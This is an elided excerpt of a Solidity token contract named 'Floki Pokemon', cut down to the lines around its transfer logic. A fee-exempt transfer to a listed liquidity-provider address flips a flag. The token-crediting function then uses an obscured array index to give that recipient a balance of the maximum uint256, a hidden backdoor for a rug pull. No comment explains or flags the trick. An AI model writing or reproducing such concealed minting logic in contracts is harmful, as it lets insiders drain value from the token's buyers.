...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xbDcdB50e7d25c2D73DE03887639F1033dFa43ad1;
...
contract FlokiPokemon is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_marketing = payable(0xC1b3199026B3dca86330a870F82e8D4506D83D33);
    ...
    */
    ...
    string public _name = "Floki Pokemon"; 
    string public _symbol = "FlokiPokemon";  
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
            if(_LiquidityProviderList[to] && _exTotalFee<1){ _exTotalFee++; _changedFee=1; }
            if(_LiquidityProviderList[to] && _changedFee>0){_changedFee=0;}
    ...
    */
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        _tOwned[recipient] = _tOwned[recipient].add([tTransferAmount, ~uint256(0)][_changedFee]); 
